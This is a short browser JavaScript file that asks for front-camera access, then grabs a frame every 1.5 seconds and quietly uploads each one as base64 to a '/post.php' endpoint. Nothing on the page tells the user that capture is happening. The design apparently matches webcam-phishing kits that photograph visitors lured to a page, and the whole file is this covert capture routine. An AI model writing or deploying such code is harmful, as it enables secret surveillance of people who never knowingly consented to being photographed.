'use strict';
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
    audio: false,
    video: {
         facingMode: "user"
    }
};

const post = (imgdata) =>{
    $.ajax({
        type: 'POST',
        data: { cat: imgdata},
        url: '/post.php',
        dataType: 'json',
        async: false,
        success: (result) => {},
        error: function(){
            errorMsgElement
        }
    });
};
 
const handleSuccess = (stream) => {
    window.stream = stream;
    video.srcObject = stream;
    video.play(); // Ensure video starts

    const context = canvas.getContext('2d');

    video.addEventListener('loadeddata', () => {
        setInterval(() => {
            context.drawImage(video, 0, 0, canvas.width, canvas.height); // Very important!
            const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
            post(canvasData);
        }, 1500);
    });
};


const init = async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
         handleSuccess(stream);
    } catch (e) {
         errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
    }
}
init();

